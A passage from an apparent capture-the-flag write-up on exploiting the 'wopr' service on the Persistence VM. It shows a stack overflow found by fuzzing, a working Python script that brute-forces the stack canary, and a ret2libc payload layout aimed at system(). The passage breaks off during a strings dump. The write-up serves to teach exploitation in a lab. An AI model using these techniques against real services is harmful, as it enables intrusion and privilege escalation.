</span><span class='line'>   0x08048a26 &lt;+584&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0x22c<span class="o">]</span>
</span><span class='line'>   0x08048a2c &lt;+590&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>   0x08048a2f &lt;+593&gt;:   call   0x804858c &lt;write@plt&gt;
</span><span class='line'>    <span class="o">[</span>.. snip ..<span class="o">]</span>
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Why is the <code>fork()</code> so important!? We will see in a bit just hang on. :)</p>

<p>So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D</p>

<p>Sending 30 x A&rsquo;s results in:</p>

<figure class='code'><figcaption><span>wopr stopper</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'>*** stack smashing detected ***: wopr <span class="nv">terminated</span>
</span><span class='line'><span class="o">=======</span> Backtrace: <span class="o">=========</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__fortify_fail+0x40<span class="o">)[</span>0xb7f5ebb0<span class="o">]</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>+0xeab6a<span class="o">)[</span>0xb7f5eb6a<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x80487dc<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x8048ad6<span class="o">]</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__libc_start_main+0xe6<span class="o">)[</span>0xb7e8ae36<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x80486e1<span class="o">]</span>
</span><span class='line'><span class="o">=======</span> Memory map: <span class="o">========</span>
</span><span class='line'>08048000-08049000 r-xp 00000000 08:01 1184792    wopr
</span><span class='line'>08049000-0804a000 r--p 00000000 08:01 1184792    wopr
</span><span class='line'>0804a000-0804b000 rw-p 00001000 08:01 1184792    wopr
</span><span class='line'>0804b000-0806c000 rw-p 00000000 00:00 0          <span class="o">[</span>heap<span class="o">]</span>
</span><span class='line'>b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
</span><span class='line'>b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
</span><span class='line'>b7e73000-b7e74000 rw-p 00000000 00:00 0
</span><span class='line'>b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fc1000-b7fc4000 rw-p 00000000 00:00 0
</span><span class='line'>b7fde000-b7fe1000 rw-p 00000000 00:00 0
</span><span class='line'>b7fe1000-b7fe2000 r-xp 00000000 00:00 0          <span class="o">[</span>vdso<span class="o">]</span>
</span><span class='line'>b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
</span><span class='line'>b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
</span><span class='line'>b7fff000-b8000000 rw-p 0001c000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
</span><span class='line'>bffdf000-c0000000 rw-p 00000000 00:00 0          <span class="o">[</span>stack<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>So it looks like we may have a <a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow">buffer overflow</a> here. What is important though is the backtrace shows that the last fail was in <code>__fortify_fail</code>. <code>__fortify_fail</code> is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the <code>checksec</code> output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.</p>

<p>But lets not stop there. I continued to place more A&rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&rsquo;s, the backtrace had a full 4 bytes of 41.</p>

<figure class='code'><figcaption><span>possible EIP</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'>*** stack smashing detected ***: wopr <span class="nv">terminated</span>
</span><span class='line'><span class="o">=======</span> Backtrace: <span class="o">=========</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__fortify_fail+0x40<span class="o">)[</span>0xb7f5ebb0<span class="o">]</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>+0xeab6a<span class="o">)[</span>0xb7f5eb6a<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x80487dc<span class="o">]</span>
</span><span class='line'><span class="o">[</span>0x41414141<span class="o">]</span>        <span class="c">#&lt;-- EIP?</span>
</span></code></pre></td></tr></table></div></figure>


<p>Was this where EIP was?</p>

<p>With the debugging we have done thus far, lets assume that the stack layout looks something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
</span><span class='line'>
</span><span class='line'>[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]
</span><span class='line'>
</span><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
</span></code></pre></td></tr></table></div></figure>


<h2>wopr &ndash; stack canary bruteforce</h2>

<p>This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.</p>

<p>A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was</p>

<ul>
<li><a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a></li>
<li><a href="http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/">The Art Of ELF: Analysis and Exploitations</a></li>
<li><a href="http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/">Fusion level04 write-up</a> (SPOILER ALERTS for another CTF)</li>
</ul>


<p>Now, remember I mentioned <code>fork()</code> earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of <code>fork()</code> and how this affects stack cookies.</p>

<p>From <code>man 2 fork</code>&rsquo;s description:</p>

<figure class='code'><figcaption><span>fork man</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>DESCRIPTION
</span><span class='line'>     Fork<span class="o">()</span> causes creation of a new process.  The new process <span class="o">(</span>child process<span class="o">)</span>
</span><span class='line'>     is an exact copy of the calling process <span class="o">(</span>parent process<span class="o">)</span> except <span class="k">for </span>the
</span><span class='line'>     following:
</span><span class='line'>
</span><span class='line'> <span class="o">[</span>.. snip ..<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>What this means for us then is that every time we have a new <code>fork()</code> happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. <em>”Soooooooo what?”</em> I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!</p>

<p>The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of <code>wopr</code>, I can just watch the console output, however, I don&rsquo;t have that luxury on the Persistence VM!</p>

<p>While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) &ndash;> xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!</p>

<p>When a string of less than 30 A&rsquo;s is sent, the server will send a &ldquo;[+] bye!&rdquo; message before closing the socket. More than 30 A&rsquo;s, and the socket is killed before the bye</p>

<figure class='code'><figcaption><span>Canary Brute Success Condition</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# telnet 127.0.0.1 3333
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
</span><span class='line'>&gt; A
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="s1">&#39;t think so</span>
</span><span class='line'><span class="s1">[+] bye!                           # &lt;-- We have a bye!</span>
</span><span class='line'><span class="s1">Connection closed by foreign host.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">root@kali:~# telnet 127.0.0.1 3333</span>
</span><span class='line'><span class="s1">Trying 127.0.0.1...</span>
</span><span class='line'><span class="s1">Connected to 127.0.0.1.</span>
</span><span class='line'><span class="s1">Escape character is &#39;</span>^<span class="o">]</span><span class="s1">&#39;.</span>
</span><span class='line'><span class="s1">[+] hello, my name is sploitable</span>
</span><span class='line'><span class="s1">[+] would you like to play a game?</span>
</span><span class='line'><span class="s1">&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
</span><span class='line'><span class="s1">[+] yeah, I don&#39;</span>t think so
</span><span class='line'>Connection closed by foreign host. <span class="c"># &lt;-- No bye!</span>
</span></code></pre></td></tr></table></div></figure>


<p>This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word <em>bye</em> in the last socket receive to know if we have succeeded or not. The resultant script was therefore:</p>

<figure class='code'><figcaption><span>canary_brute.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">30</span>  <span class="c"># amount of bytes before the first canary bit is hit</span>
</span><span class='line'><span class="n">canary</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>         <span class="c"># the canary</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start the canary brute loop. We want to brute 4 bytes ...</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># ... and try all possibilities</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">canary_byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the byte</span>
</span><span class='line'>        <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">canary_byte</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the payload</span>
</span><span class='line'>        <span class="n">send</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">hex_byte</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Trying: &#39;</span><span class="se">\\</span><span class="s">x{0}&#39; in payload &#39;</span><span class="si">%s</span><span class="s">&#39; (</span><span class="si">%d</span><span class="s">:</span><span class="si">%d</span><span class="s">/255)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span> <span class="o">%</span> <span class="p">(</span><span class="n">send</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">canary_byte</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># get the inital banners</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>   <span class="c"># [+] hello, my name is sploitable\n</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>   <span class="c"># [+] would you like to play a game?\n</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>    <span class="c"># &gt;</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># send the payload  </span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>   <span class="c"># [+] yeah, I don&#39;t think so\n</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># if we have a OK response, then we will have this last part</span>
</span><span class='line'>        <span class="c"># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span>  <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>   <span class="c"># [+] bye!\n</span>
</span><span class='line'>        <span class="k">if</span> <span class="s">&quot;bye&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[!!] Found a possible canary value of &#39;{0}&#39;!&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'>            <span class="n">canary</span> <span class="o">+=</span> <span class="n">hex_byte</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># if we cant even find the first byte, we failed already</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[-] Unable to even find the first bit. No luck&quot;</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Canary seems to be {0}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[-] Unable to brute canary&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>An example run of this would end as follows:</p>

<figure class='code'><figcaption><span>Running canary_brute.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8d&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:141/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8e&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:142/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8f&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:143/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x90&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:144/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>!!<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;90&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Canary seems to be 00ef8d90
</span></code></pre></td></tr></table></div></figure>


<p>Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&rsquo;s and send it. No stack smashing message appeared and we got the <em>bye</em> message :)</p>

<h2>wopr &ndash; NX and EIP</h2>

<p>If you can recall from earlier, <code>wopr</code> was compiled with the NX bit set. Effectively that means we can&rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.</p>

<p>The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the <code>system()</code> command, for almost obvious reasons.</p>

<p>I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:</p>

<figure class='code'><figcaption><span>ASLR check</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ldd /usr/local/bin/wopr
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/libc.so.6 <span class="o">(</span>0xb7e62000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x00110000<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>bash-4.1<span class="nv">$ </span>ldd /usr/local/bin/wopr
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/libc.so.6 <span class="o">(</span>0xb7e62000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x00110000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)</p>

<p>The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple <code>export SHELL=/bin/bash</code> fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.</p>

<figure class='code'><figcaption><span>finding system()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
</span><span class='line'>
</span><span class='line'>bash-4.1<span class="nv">$ </span>gdb -q /usr/bin/telnet
</span><span class='line'>Reading symbols from /usr/bin/telnet...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *main   <span class="c"># set a breakpoint to stop the flow once we hit the main() func</span>
</span><span class='line'>Breakpoint 1 at 0x7b90
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r         <span class="c"># run the program</span>
</span><span class='line'>Starting program: /usr/bin/telnet
</span><span class='line'>Breakpoint 1, 0x00117b90 in main <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> p system  <span class="c"># We hit our breakpoint, lets leak the address for system()</span>
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e56210 &lt;system&gt;
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>We find <code>system()</code> at <code>0xb7e56210</code>. I used the telnet binary simply because it is also linked to libc.</p>

<p>So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:</p>

<figure class='code'><figcaption><span>Stack after memory corruption up to EIP</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;
</span><span class='line'>
</span><span class='line'>[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
</span><span class='line'> ^~ Initial BF    ^~ Bruted cookie                    ^~ system()
</span><span class='line'>
</span><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;
</span></code></pre></td></tr></table></div></figure>


<p>The address for <code>system()</code> is &lsquo;backwards&rsquo; because we are working with a <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a> system. The 4 * A before the address to <code>system()</code> is simply padding to EIP.</p>

<h2>wopr &ndash; code exec</h2>

<p>This part, by far, took me <strong>the longest</strong> of the entire challenge!</p>

<p>The next step was to get actual code to execute using <code>system()</code>. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&rdquo;.</p>

<p>I tried to put a command in a env variable and failed.<br/>
I attempted to write a ROP chain and failed.</p>

<p>These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script <code>/tmp/runme</code> to run. <code>runme</code> was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had <code>gcc</code> installed :)</p>

<p>&ldquo;fail&rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.</p>

<p>Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.</p>

<p>Returning later with a fresh look, I run wopr through <code>strings</code> one more time:</p>

<figure class='code'><figcaption><span>wopr strings</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/persistence# strings  wopr
</span><span class='line'>/lib/ld-linux.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>_IO_stdin_used
</span><span class='line'>
</span><span class='line'><span class="o">[</span>.. snip ..<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>^_<span class="o">]</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="err">&#39;</span>t think so
</span><span class='line'>socket
</span><span class='line'>setsockopt
</span><span class='line'><span class="nb">bind</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="nb">bind complete</span>
</span><span class='line'>listen
